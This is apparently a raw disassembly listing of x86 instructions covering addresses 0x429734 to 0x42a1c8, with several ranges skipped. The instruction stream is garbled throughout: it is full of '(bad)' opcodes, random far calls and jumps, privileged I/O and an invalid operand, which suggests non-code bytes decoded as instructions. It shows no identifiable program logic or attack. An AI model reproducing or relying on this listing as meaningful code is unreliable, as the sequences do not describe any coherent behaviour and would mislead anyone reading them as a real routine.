  429734:	mov    esp,0x8c3c691b
  429739:	pop    ecx
  42973a:	inc    ecx
  42973b:	popf   
  42973c:	pop    ebx
  42973d:	mov    dl,0xd1
  42973f:	or     DWORD PTR [esp+edx*8-0x7243497e],eax
  429746:	dec    eax
  429747:	push   ss
  429748:	lods   eax,DWORD PTR ds:[esi]
  429749:	test   BYTE PTR [edx-0x41],ch
  42974c:	mov    dh,0xaf
  42974e:	sbb    BYTE PTR [eax+edi*4+0x4b6788c6],0x5f
  429756:	xchg   ebp,eax
  429757:	cs shl edx,1
  42975a:	jnp    0x42975f
  42975c:	or     ebx,DWORD PTR [edi+eax*4]
  42975f:	pop    eax
  429760:	enter  0xd649,0xb2
  429764:	aaa    
  429765:	jno    0x429745
  429767:	cmp    DWORD PTR [eax],0x92028463
  42976d:	inc    ebx
  42976e:	and    ah,BYTE PTR [edx-0x61b1ddcd]
  429774:	pop    ecx
  429775:	push   ebx
  429776:	adc    al,BYTE PTR [ecx+ebp*8]
  429779:	xchg   edi,eax
  42977a:	pop    ebp
  42977c:	jbe    0x42977b
  42977e:	bound  eax,QWORD PTR [edi]
  429780:	adc    al,0x6e
  429782:	dec    edi
  429783:	pop    edx
  429784:	shr    DWORD PTR [esi+0x4c],1
  429787:	cmp    dh,al
  429789:	repz ss test eax,0x397405b3
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	imul   esi,DWORD PTR [edx-0x2c],0x1bb747d
  429807:	add    BYTE PTR [ecx+eax*1],al
  42980a:	add    BYTE PTR [eax],al
  42980c:	rol    BYTE PTR [ebx-0x660ff740],0x32
  429813:	pop    esp
  429814:	dec    esp
  429815:	mov    cs,WORD PTR [esp+edx*2+0x64]
  429819:	imul   eax,DWORD PTR [ebx+0x33],0x66d9550
  429820:	(bad)  
  429821:	out    dx,al
  429822:	fwait
  429823:	lods   al,BYTE PTR ds:[esi]
  429824:	xchg   edi,eax
  429825:	mov    ebx,0xebea4875
  42982a:	out    0x82,eax
  42982c:	jnp    0x42981c
  42982e:	call   0x3322:0xf2aaa1b0
  429835:	jae    0x429836
  429837:	and    dl,cl
  429839:	dec    ecx
  42983a:	outs   dx,BYTE PTR ds:[esi]
  42983b:	mov    ch,BYTE PTR [ebx+0x4c]
  42983e:	inc    esp
  42983f:	mov    eax,ds:0x7b209f9f
  429844:	or     cl,ah
  429846:	ins    DWORD PTR es:[edi],dx
  429847:	(bad)  
  429848:	aam    0xec
  42984a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42984b:	dec    esi
  42984c:	dec    ecx
  42984d:	adc    eax,0x43d2e236
  429852:	outs   dx,DWORD PTR ds:[esi]
  429853:	jmp    0x3ca7cd38
  429858:	push   es
  429859:	jecxz  0x4298ca
  42985b:	lock lock or al,0xdc
  42985f:	frstor ds:0xc4813482
  429865:	pop    ebx
  429866:	imul   eax,DWORD PTR [edi-0x27],0x11
  42986a:	inc    eax
  42986b:	jo     0x4298b8
  42986d:	sbb    DWORD PTR [edx],edi
  42986f:	and    DWORD PTR [eax],ebp
  429871:	mov    al,0x3a
  429873:	jle    0x429833
  429875:	daa    
  429876:	test   ah,al
  429878:	iret   
  429879:	mov    edi,0x78a9e391
  42987e:	dec    ebx
  42987f:	stc    
  429880:	and    cl,BYTE PTR [edi+0x5e877ced]
  429886:	outs   dx,BYTE PTR ds:[esi]
  429887:	popf   
  429888:	jmp    0x429822
  42988a:	mov    ebp,0xf919f96
  42988f:	shl    BYTE PTR [esi+edx*2-0x73038cfb],0x84
  429897:	pop    ebx
  429898:	xor    esi,esp
  42989a:	push   ecx
  42989b:	in     al,0x32
  42989d:	mov    ecx,0x11065fa6
  4298a2:	sbb    esi,DWORD PTR [edx-0x6d1ca042]
  4298a8:	sahf   
  4298a9:	loop   0x42985c
  4298ab:	addr16 dec eax
  4298ad:	cs dec edx
  4298af:	jmp    0x485e:0x44eea054
  4298b6:	mov    BYTE PTR [ebp-0x3d],bh
  4298b9:	es sub al,0x40
  4298bc:	mov    ds:0x6f1e8118,eax
  4298c1:	add    al,0xfa
  4298c3:	ret    0x372a
  4298c6:	daa    
  4298c7:	mov    edi,0x65c3eebb
  4298cc:	mov    al,ds:0x12a2a7af
  4298d1:	push   ebp
  4298d2:	mov    cl,0x7a
  4298d4:	mov    edi,0xd49e4424
  4298d9:	xchg   esi,eax
  4298da:	out    dx,al
  4298db:	add    DWORD PTR [eax+edi*2-0x71],ebx
  4298df:	shl    BYTE PTR [edx+eiz*2+0x32],0x8e
  4298e4:	popa   
  4298e5:	test   al,0xeb
  4298e7:	sub    edx,ecx
  4298e9:	gs mov edx,0x717bacda
  4298ef:	dec    edi
  4298f0:	popa   
  4298f1:	push   0x9
  4298f3:	mov    ah,0x40
  4298f5:	cmp    edx,DWORD PTR [edx]
  4298f7:	aaa    
  4298f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298f9:	stos   DWORD PTR es:[edi],eax
  4298fa:	sbb    edx,ebx
  4298fc:	and    esi,ebx
  4298fe:	mov    eax,ds:0xa3940a43
  429903:	call   DWORD PTR [eax]
  429905:	dec    ebx
  429906:	out    0x17,al
  429908:	ss in  eax,dx
  42990a:	or     al,0xe4
  42990c:	sbb    eax,0xb160f2
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	pop    ebp
  429981:	or     BYTE PTR [edx],0xf9
  429984:	js     0x429942
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	adc    DWORD PTR [eax-0xe48b344],0x6e33229d
  429996:	jl     0x429920
  429998:	fnstenv [edx]
  42999a:	test   al,0x7f
  42999c:	jns    0x429926
  42999e:	(bad)  
  42999f:	aaa    
  4299a0:	dec    esp
  4299a1:	pushf  
  4299a2:	xchg   edx,eax
  4299a3:	jge    0x42992b
  4299a5:	sub    eax,0xdf566c12
  4299aa:	jle    0x429995
  4299ac:	inc    edx
  4299ad:	in     al,0x45
  4299af:	enter  0x76ad,0xe0
  4299b3:	mov    bh,0xb7
  4299b5:	out    0x52,eax
  4299b7:	ds xor al,0xd9
  4299ba:	dec    eax
  4299bb:	add    eax,0x46726660
  4299c0:	(bad)
  4299c3:	mov    esi,0xbf33ca24
  4299c8:	shr    esp,0x68
  4299cb:	pop    ebx
  4299cc:	rol    DWORD PTR [ecx+0x27c063d2],1
  4299d2:	out    0xa5,al
  4299d4:	xchg   ebp,eax
  4299d5:	pushf  
  4299d6:	fild   WORD PTR [esp+ebp*1+0x7415a3b]
  4299dd:	push   es
  4299de:	pop    ecx
  4299df:	aad    0xa3
  4299e1:	dec    edi
  4299e2:	jg     0x429a32
  4299e4:	(bad)  
  4299e5:	popf   
  4299e6:	ja     0x429a01
  4299e8:	idiv   DWORD PTR [ebx]
  4299ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299eb:	lea    edi,ds:0x760530aa
  4299f1:	sub    DWORD PTR [ecx-0x5bb4fffc],0xffffffcd
  4299f8:	inc    esp
  4299f9:	sub    BYTE PTR [esi],cl
  4299fb:	inc    ebp
  4299fc:	repnz popw es
  4299ff:	mov    ds:0x540d112c,al
  429a04:	pushf  
  429a05:	(bad)
  429a08:	jno    0x4299b5
  429a0a:	mov    edi,esi
  429a0c:	daa    
  429a0d:	inc    ebx
  429a0e:	inc    eax
  429a0f:	fnstcw WORD PTR [edi]
  429a11:	(bad)  
  429a12:	(bad)  
  429a13:	fsub   QWORD PTR [edx+0x79]
  429a16:	ins    DWORD PTR es:[edi],dx
  429a17:	cmp    ebx,DWORD PTR [edx]
  429a19:	cmp    ebp,DWORD PTR [edx+edx*8]
  429a1c:	sub    DWORD PTR [esi-0x58e1e67],edi
  429a22:	jbe    0x429a21
  429a24:	test   al,0x45
  429a26:	jnp    0x429a04
  429a28:	std    
  429a29:	shr    BYTE PTR [eax],1
  429a2b:	(bad)  
  429a2c:	pop    ss
  429a2d:	add    dl,ch
  429a2f:	pop    ss
  429a30:	jg     0x429a35
  429a32:	test   BYTE PTR [edx],bh
  429a34:	(bad)  
  429a35:	fsub   DWORD PTR [ebp+0x5f]
  429a38:	jae    0x429a05
  429a3a:	das    
  429a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a3c:	repnz rol BYTE PTR [ebx+0x31be01c9],cl
  429a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a44:	or     bh,dl
  429a46:	lock addr16 mov ds:0xe24,eax
  429a4b:	jns    0x429a1e
  429a4d:	xor    bl,ch
  429a4f:	adc    eax,0x38f574f5
  429a54:	mov    dh,0x31
  429a56:	dec    ebx
  429a57:	sbb    eax,0x49c0c5b8
  429a5c:	int3   
  429a5d:	sub    BYTE PTR [ecx+0x55],dh
  429a60:	cwde   
  429a61:	int3   
  429a62:	jecxz  0x429ad6
  429a64:	jae    0x429ad1
  429a66:	sub    eax,0xde0c8e72
  429a6b:	(bad)  
  429a6c:	call   0xf000b992
  429a71:	or     ch,ch
  429a73:	mov    cl,BYTE PTR [edi-0x77]
  429a76:	stc    
  429a77:	es fwait
  429a79:	loop   0x429a56
  429a7b:	pop    ebx
  429a7c:	sbb    al,BYTE PTR [eax-0x9]
  429a7f:	clc    
  429a80:	(bad)  
  429a81:	shr    esp,1
  429a83:	xor    DWORD PTR [ebx-0x56],eax
  429a86:	push   cs
  429a87:	ret    
  429a88:	ja     0x429a6e
  429a8a:	mov    esp,0xb618a264
  429a8f:	arpl   WORD PTR [eax],ax
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xcfa95667
  429b01:	dec    esp
  429b02:	inc    ecx
  429b03:	sub    al,0x7c
  429b05:	mov    ebp,0x1040001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	mov    bl,0x35
  429b0e:	enter  0xcf4,0x6d
  429b12:	data16 mov dh,0xde
  429b15:	je     0x429b16
  429b17:	int    0xf4
  429b19:	sub    DWORD PTR [edi-0x1d],ecx
  429b1c:	cmp    esi,ecx
  429b1e:	test   DWORD PTR [eax+0x74865a49],ebx
  429b24:	(bad)  
  429b25:	mov    esp,0x44cddb13
  429b2a:	je     0x429ac0
  429b2c:	mov    ecx,0xc08ef29
  429b31:	scas   eax,DWORD PTR es:[edi]
  429b32:	(bad)  
  429b33:	repnz xor BYTE PTR [edi-0x42],al
  429b37:	lahf   
  429b38:	push   0x53
  429b3a:	out    0x8a,al
  429b3c:	shr    DWORD PTR [edx],0xc0
  429b3f:	add    cl,ah
  429b41:	out    dx,eax
  429b42:	adc    cl,0x6d
  429b45:	or     eax,0xfcf5d6b5
  429b4a:	jmp    0x429b81
  429b4c:	lock fisubr DWORD PTR [esi]
  429b4f:	sub    bh,BYTE PTR [esi-0x9]
  429b52:	pop    ebp
  429b53:	pop    eax
  429b54:	fsubr  QWORD PTR [ebx]
  429b56:	aas    
  429b57:	mov    cl,0x62
  429b59:	sub    DWORD PTR [edx+0x4a2d79ff],eax
  429b5f:	pop    esp
  429b60:	and    al,0x20
  429b62:	mov    bl,0x79
  429b64:	ret    0xe436
  429b67:	fcomp  QWORD PTR [ecx+0x31f70be3]
  429b6d:	js     0x429b65
  429b6f:	addr16 inc edx
  429b71:	out    dx,eax
  429b72:	aas    
  429b73:	(bad)  
  429b74:	rcr    BYTE PTR [ebx+0x2b83f3e9],0x50
  429b7b:	sti    
  429b7c:	pop    ecx
  429b7d:	mov    ch,0xcd
  429b7f:	bnd jne 0x429b86
  429b82:	sub    al,0x2f
  429b84:	jo     0x429bde
  429b86:	mov    al,0x62
  429b88:	add    eax,0x7f680795
  429b8d:	push   edi
  429b8e:	ds cs xchg edx,eax
  429b91:	cmc    
  429b92:	xchg   edx,eax
  429b93:	push   cs
  429b94:	xor    BYTE PTR es:[eax+edi*4-0x76],ch
  429b99:	test   DWORD PTR [ecx-0x5c],ecx
  429b9c:	push   ss
  429b9d:	(bad)  
  429b9e:	lods   al,BYTE PTR ds:[esi]
  429b9f:	sbb    esi,DWORD PTR [eiz*2+0x77c68e3d]
  429ba6:	cmp    eax,0xc633f6bf
  429bab:	cmp    edi,DWORD PTR [ecx-0x13]
  429bae:	push   eax
  429baf:	mov    ebp,0x7c59dacb
  429bb4:	pop    DWORD PTR [edx-0x72]
  429bb7:	and    eax,0x2f34092f
  429bbc:	sub    ecx,edi
  429bbe:	xor    BYTE PTR [edi+0x285f2432],0xb6
  429bc5:	lea    ebx,[ebp*4-0x3dd4ba2c]
  429bcc:	in     eax,0xfd
  429bce:	dec    ebp
  429bcf:	mov    bh,ah
  429bd1:	inc    edx
  429bd2:	fisttp DWORD PTR [edi-0x32a73331]
  429bd8:	iret   
  429bd9:	mov    esi,0x5ef265e4
  429bde:	or     al,BYTE PTR [esi-0x74]
  429be1:	mov    edx,0xdb8d6826
  429be6:	or     dh,BYTE PTR [ebp+ecx*1+0x1f]
  429bea:	outs   dx,DWORD PTR ds:[esi]
  429beb:	cmp    eax,0x77f25eb
  429bf0:	in     al,dx
  429bf1:	fisttp WORD PTR [ebx]
  429bf3:	inc    ecx
  429bf4:	adc    eax,esp
  429bf6:	xlat   BYTE PTR ds:[ebx]
  429bf7:	fistp  DWORD PTR [eax+ebx*8]
  429bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bfb:	pop    ds
  429bfc:	sub    al,0xf7
  429bfe:	add    bl,dh
  429c00:	sub    eax,DWORD PTR [ebx+edi*1+0x49]
  429c04:	sbb    eax,0x1f841128
  429c09:	push   eax
  429c0a:	sar    DWORD PTR [edx+0x1],0xb8
  429c0e:	call   FWORD PTR [eax+0x0]
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    ch,ch
  429c81:	jecxz  0x429cf4
  429c83:	out    dx,al
  429c84:	cmp    BYTE PTR [esi+0x1040001],0x0
  429c8b:	add    BYTE PTR [edx+eiz*1],ch
  429c8e:	div    dl
  429c90:	pop    edi
  429c91:	daa    
  429c92:	ss cld 
  429c94:	clc    
  429c95:	push   ecx
  429c96:	push   ebx
  429c97:	das    
  429c98:	sbb    cl,BYTE PTR [ebp-0x7]
  429c9b:	inc    eax
  429c9c:	fadd   DWORD PTR [edx-0x3e40a6f9]
  429ca2:	and    BYTE PTR [edi-0x7],ch
  429ca5:	rol    DWORD PTR [ebx+0x4802bc69],1
  429cab:	test   al,0x84
  429cad:	in     eax,0x28
  429caf:	xor    al,BYTE PTR [ebp+0xd]
  429cb2:	mov    BYTE PTR [ebx+0x5b4da95f],bl
  429cb8:	je     0x429ca9
  429cba:	hlt    
  429cbb:	hlt    
  429cbc:	fbstp  TBYTE PTR [edi-0x15f4fd17]
  429cc2:	dec    ecx
  429cc3:	xor    DWORD PTR [ecx+0x1302b89a],eax
  429cc9:	lods   al,BYTE PTR ds:[esi]
  429cca:	pusha  
  429ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ccc:	push   0xffffffeb
  429cce:	jp     0x429ce3
  429cd0:	sti    
  429cd1:	test   al,0xe
  429cd3:	out    dx,al
  429cd4:	sbb    eax,0xa5bd16a8
  429cd9:	jp     0x429ce3
  429cdb:	and    eax,0xab0166fb
  429ce0:	popf   
  429ce1:	sub    al,0x61
  429ce3:	retf   
  429ce4:	pushf  
  429ce5:	dec    esp
  429ce6:	(bad)  [edx]
  429ce8:	dec    DWORD PTR [edx-0x1c]
  429ceb:	cmp    al,0xaa
  429ced:	sub    ebx,esi
  429cef:	xor    al,0xd4
  429cf1:	push   ebp
  429cf2:	xchg   BYTE PTR [eax+0xfffca85],dh
  429cf8:	test   esp,eax
  429cfa:	pusha  
  429cfb:	adc    al,0xa0
  429cfd:	outs   dx,DWORD PTR ds:[esi]
  429cfe:	(bad)  
  429cff:	shl    BYTE PTR [ebx],cl
  429d01:	div    DWORD PTR [ebx-0x68]
  429d04:	lea    ebx,[esi]
  429d06:	xchg   edx,eax
  429d07:	mov    ecx,0xf70e83d5
  429d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d0d:	and    DWORD PTR [esi],eax
  429d0f:	push   esp
  429d10:	inc    ecx
  429d11:	adc    ch,BYTE PTR [eax]
  429d13:	ds cmp al,bh
  429d16:	dec    esp
  429d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d18:	outs   dx,DWORD PTR ds:[esi]
  429d19:	xchg   BYTE PTR [edi+ebp*2+0x61],al
  429d1d:	in     eax,dx
  429d1e:	bnd gs jmp 0x429d90
  429d22:	add    DWORD PTR [eax-0xc5cdfcf],0x81c33530
  429d2c:	xor    BYTE PTR [edi-0x58],bh
  429d2f:	call   0xc017:0x75b4a7a8
  429d36:	jmp    0xd8dc5dd7
  429d3b:	inc    ecx
  429d3c:	hlt    
  429d3d:	sbb    BYTE PTR [ebx+eax*1],cl
  429d40:	sub    eax,DWORD PTR [ebp+eax*4+0x78]
  429d44:	sbb    al,0x42
  429d46:	or     al,0x63
  429d48:	pop    ecx
  429d49:	(bad)  [eax+eax*2+0x3463fec7]
  429d50:	mov    ds:0x2227c7c0,eax
  429d55:	(bad)  
  429d57:	rol    DWORD PTR [ebx],cl
  429d59:	and    DWORD PTR [ecx-0x4ad92bb5],ecx
  429d5f:	das    
  429d60:	enter  0x5bd5,0x20
  429d64:	dec    edx
  429d65:	fst    QWORD PTR [esp+edi*1]
  429d68:	mov    cl,0xaf
  429d6a:	cld    
  429d6b:	push   DWORD PTR [edi+eiz*2]
  429d6e:	mov    eax,0xf33e9fdb
  429d73:	cwde   
  429d74:	adc    al,0xbf
  429d76:	retf   
  429d77:	add    al,0xde
  429d79:	rol    BYTE PTR [esi+0x3dd7abe8],0xef
  429d80:	pop    eax
  429d81:	fs inc esi
  429d83:	add    BYTE PTR [ebx+0x7],cl
  429d86:	mov    esp,0xcd2cfcca
  429d8b:	scas   al,BYTE PTR es:[edi]
  429d8c:	int    0x40
  429d8e:	popf   
  429d8f:	scas   eax,DWORD PTR es:[edi]
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	jo     0x429de6
  429e02:	ins    BYTE PTR es:[edi],dx
  429e03:	add    al,0x84
  429e05:	mov    edi,0x1040001
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	add    BYTE PTR [ecx+0x7032e1f3],al
  429e12:	adc    dh,ah
  429e14:	ret    
  429e15:	or     eax,0x6529ef83
  429e1a:	sbb    bl,0x87
  429e1d:	pop    esi
  429e1e:	in     al,dx
  429e1f:	push   ebp
  429e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e21:	add    eax,0xafb55d7f
  429e26:	pop    ds
  429e27:	pop    es
  429e28:	jmp    0x63f8:0x74d1d3c7
  429e2f:	mov    ds:0x69f4cdc2,eax
  429e34:	jnp    0x429e6f
  429e36:	shl    BYTE PTR [edx],0x3e
  429e39:	enter  0xd0ce,0x90
  429e3d:	(bad)  
  429e40:	jmp    0xacee:0x7e5166f8
  429e47:	aad    0x5e
  429e49:	mov    eax,ds:0xfffc0ef3
  429e4e:	int    0x5a
  429e50:	inc    eax
  429e51:	add    eax,0x37990f51
  429e56:	xchg   edi,eax
  429e57:	stc    
  429e58:	ret    0x856a
  429e5b:	sub    BYTE PTR [edx-0x9c0935],al
  429e61:	std    
  429e62:	xchg   ebx,eax
  429e63:	std    
  429e64:	enter  0xc4b4,0xcf
  429e68:	std    
  429e69:	inc    edi
  429e6a:	ins    DWORD PTR es:[edi],dx
  429e6b:	cs push esp
  429e6d:	call   0x9037cb8
  429e72:	inc    edi
  429e73:	mov    ch,0x45
  429e75:	mov    ch,0xff
  429e77:	call   0x105:0xfad392f9
  429e7e:	in     eax,0x77
  429e80:	outs   dx,BYTE PTR ds:[esi]
  429e81:	es push esp
  429e83:	add    ebp,DWORD PTR [ecx]
  429e85:	js     0x429ef7
  429e87:	pop    ebp
  429e88:	mov    esp,0x8c85e170
  429e8d:	pop    edx
  429e8e:	(bad)  
  429e8f:	test   DWORD PTR [eax+eax*1+0x34],0x3704034
  429e97:	and    BYTE PTR [ecx+eiz*4+0x70b2cbbd],bh
  429e9e:	xchg   edx,eax
  429e9f:	inc    eax
  429ea0:	or     DWORD PTR [esi-0x19],edx
  429ea3:	mov    esi,0xc9256005
  429ea8:	test   DWORD PTR [ecx-0xc],ebp
  429eab:	sti    
  429eac:	cmp    DWORD PTR [esi-0x2d1e37c5],0x49
  429eb3:	dec    ebp
  429eb4:	xchg   edx,eax
  429eb5:	inc    edi
  429eb6:	mov    bl,0xad
  429eb8:	xchg   edi,eax
  429eb9:	addr16 cld 
  429ebb:	cmp    eax,0xe047f0dc
  429ec0:	popa   
  429ec1:	es jns 0x429f24
  429ec4:	(bad)  
  429ec5:	imul   ebx,esi,0xffffffb2
  429ec8:	ficom  WORD PTR [ebx-0x43e5b713]
  429ece:	out    0x41,al
  429ed0:	sub    al,0xea
  429ed2:	lea    edx,[eax-0x4f]
  429ed5:	les    ebp,FWORD PTR [ecx-0x55c5f42b]
  429edb:	imul   ebp,DWORD PTR [edi+0x4a60c545],0x2148b335
  429ee5:	and    BYTE PTR [esi-0x80],0x8b
  429ee9:	cmp    esi,DWORD PTR [edi-0x517d73f5]
  429eef:	inc    ecx
  429ef0:	test   al,0xda
  429ef2:	sbb    BYTE PTR [esi+0x7d70bd57],bh
  429ef8:	xor    edi,DWORD PTR [eax]
  429efa:	sbb    DWORD PTR ds:0xe6f94c6c,0x7d3111d9
  429f04:	mov    ebx,0xe6f3a17d
  429f09:	lds    ecx,FWORD PTR [edx+0x33]
  429f0c:	out    0x41,eax
  429f0e:	iret   
  429f0f:	pushf  
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x20314c0f]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	cwde   
  429f8d:	loop   0x429fb9
  429f8f:	adc    DWORD PTR [ebx],esp
  429f91:	not    esi
  429f93:	iret   
  429f94:	dec    esi
  429f95:	add    eax,0x660b8512
  429f9a:	jmp    0x53ede32b
  429f9f:	jbe    0x429fd3
  429fa1:	mov    es:0xc0024896,al
  429fa7:	nop
  429fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fa9:	or     eax,0xb0b9264a
  429fae:	mov    ebp,0x86f1b5a1
  429fb3:	xchg   BYTE PTR [eax-0x38],bh
  429fb6:	in     eax,0x4
  429fb8:	ja     0x429fb3
  429fba:	inc    ebp
  429fbb:	retf   0x2ea4
  429fbe:	cmp    DWORD PTR [esi+0x696c07f8],esi
  429fc4:	pop    es
  429fc5:	sub    DWORD PTR [esi-0x202e91be],ebp
  429fcb:	aam    0xb2
  429fcd:	dec    esi
  429fce:	stos   BYTE PTR es:[edi],al
  429fcf:	push   cs
  429fd0:	adc    edx,DWORD PTR es:[edi+0x6b9aa66f]
  429fd7:	ja     0x429f5f
  429fd9:	idiv   BYTE PTR [ecx+0x44]
  429fdc:	sbb    eax,esi
  429fde:	outs   dx,DWORD PTR ds:[esi]
  429fdf:	scas   al,BYTE PTR es:[edi]
  429fe0:	int    0x16
  429fe2:	(bad)  
  429fe3:	sbb    al,0xd8
  429fe5:	div    BYTE PTR [esi+0x302016f0]
  429feb:	add    DWORD PTR [esi],ecx
  429fed:	jp     0x429fb0
  429fef:	pop    ds
  429ff0:	add    BYTE PTR [ecx],cl
  429ff2:	mov    ebx,0xa2e37c81
  429ff7:	adc    DWORD PTR [edi-0x34],ecx
  429ffa:	arpl   cx,dx
  429ffc:	(bad)  
  429ffd:	stc    
  429ffe:	sahf   
  429fff:	mov    dh,0x74
  42a001:	push   edx
  42a002:	push   ebp
  42a003:	add    BYTE PTR [ecx+edi*1+0xed03257],bl
  42a00a:	push   es
  42a00b:	add    edx,eax
  42a00d:	mov    cl,0x8e
  42a00f:	idiv   DWORD PTR [esp+eax*4]
  42a012:	add    eax,0x5a9a57a3
  42a017:	lea    ebp,[edx+0xb8e2552]
  42a01d:	arpl   WORD PTR [edi],sp
  42a01f:	shr    DWORD PTR [edi],1
  42a021:	retf   
  42a022:	(bad)  
  42a023:	iret   
  42a024:	pop    edi
  42a025:	push   ecx
  42a026:	sahf   
  42a027:	std    
  42a028:	mov    cl,ch
  42a02a:	call   0xfb455630
  42a02f:	in     al,dx
  42a030:	push   esi
  42a031:	inc    edi
  42a032:	jo     0x42a001
  42a034:	pop    ebp
  42a035:	mov    esp,0x696a7581
  42a03a:	sub    al,BYTE PTR [ecx+0x429c9c78]
  42a040:	fidivr DWORD PTR [esi-0x17872f78]
  42a046:	and    eax,0x456d56f5
  42a04b:	test   eax,0x848ab18d
  42a050:	push   eax
  42a051:	je     0x42a04f
  42a053:	test   al,0x38
  42a055:	sbb    cl,ch
  42a057:	and    DWORD PTR [edx],ebx
  42a059:	xor    ecx,eax
  42a05b:	add    DWORD PTR ds:0x6255b1e,eax
  42a061:	call   0xc220:0x5f1672bb
  42a068:	cdq    
  42a069:	inc    DWORD PTR [ebp+0x4c82cce1]
  42a06f:	es push ebp
  42a071:	addr16 sti 
  42a073:	fist   WORD PTR [eax]
  42a075:	dec    esp
  42a076:	aad    0x4a
  42a078:	mov    ch,0x30
  42a07a:	dec    ebp
  42a07b:	cmp    al,0x57
  42a07d:	push   0x36d59f91
  42a082:	sar    DWORD PTR [edx+0x56],1
  42a085:	adc    eax,eax
  42a087:	ret    0x3033
  42a08a:	ss test ebp,esi
  42a08d:	jge    0x42a0a2
  42a08f:	inc    esp
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	jl     0x42a0c5
  42a102:	push   edi
  42a103:	xor    al,0x8c
  42a105:	rol    DWORD PTR [ecx],0x0
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	js     0x42a099
  42a10e:	js     0x42a165
  42a110:	mov    al,0x5
  42a112:	pop    eax
  42a113:	dec    ebx
  42a114:	pop    ebp
  42a115:	mov    BYTE PTR [edx+eiz*4+0x15194251],0xde
  42a11d:	stos   DWORD PTR es:[edi],eax
  42a11e:	shl    BYTE PTR [ecx+0x1bea3541],1
  42a124:	xchg   bl,dl
  42a126:	mov    al,0xc
  42a128:	mov    dh,0x28
  42a12a:	dec    eax
  42a12b:	sub    BYTE PTR [esi+eax*8+0x3ce6f15],ah
  42a132:	cs std 
  42a134:	add    ebx,DWORD PTR [ecx]
  42a136:	or     ebp,DWORD PTR [ecx-0x449f2054]
  42a13c:	fs mov ebx,0x71e83be0
  42a142:	retf   0x4d0
  42a145:	add    dh,BYTE PTR [edx-0x24f623af]
  42a14b:	pop    es
  42a14c:	aam    0x16
  42a14e:	popa   
  42a14f:	ret    0x9e61
  42a152:	dec    ebp
  42a153:	ret    
  42a154:	into   
  42a155:	stos   BYTE PTR es:[edi],al
  42a156:	ret    0xe02f
  42a159:	cmp    BYTE PTR [esi-0x5a69b2e3],cl
  42a15f:	clc    
  42a160:	pop    ebp
  42a161:	or     DWORD PTR [ecx],0xffffffab
  42a164:	push   edi
  42a165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a166:	aam    0x9
  42a168:	mov    dh,0x76
  42a16a:	push   ebx
  42a16b:	xchg   esp,eax
  42a16c:	push   ss
  42a16d:	pop    esp
  42a16e:	jl     0x42a1b2
  42a170:	mov    ?,WORD PTR [ebx+ebp*8+0x8ba09f8]
  42a177:	xlat   BYTE PTR ds:[ebx]
  42a178:	outs   dx,DWORD PTR ds:[esi]
  42a179:	push   0xeb4e403b
  42a17e:	icebp  
  42a17f:	add    BYTE PTR [ecx+0x32],dh
  42a182:	and    cl,BYTE PTR [eax-0x5b9dd203]
  42a188:	clc    
  42a189:	dec    edx
  42a18a:	and    al,0x7b
  42a18c:	add    DWORD PTR [edx+0x4],esp
  42a18f:	mov    ebx,0x7a5e1caa
  42a194:	cwde   
  42a195:	sub    ebx,DWORD PTR [edi+0x5d]
  42a198:	dec    ebp
  42a199:	ja     0x42a17a
  42a19b:	mov    cs,WORD PTR [edi-0x5f579a5e]
  42a1a1:	fwait
  42a1a2:	add    edi,0x14
  42a1a5:	mov    esp,0xf446abf0
  42a1aa:	cmp    eax,DWORD PTR [esi]
  42a1ac:	in     al,dx
  42a1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1ae:	call   0x4371:0xed170eb9
  42a1b5:	jmp    0x42a1dc
  42a1b7:	imul   eax,DWORD PTR [ebx-0x53fd3c72],0xf21805cd
  42a1c1:	jne    0x42a1e2
  42a1c3:	sub    BYTE PTR [eax+0x37],dl
  42a1c6:	test   ebx,edi
  42a1c8:	test   BYTE PTR [edx],al
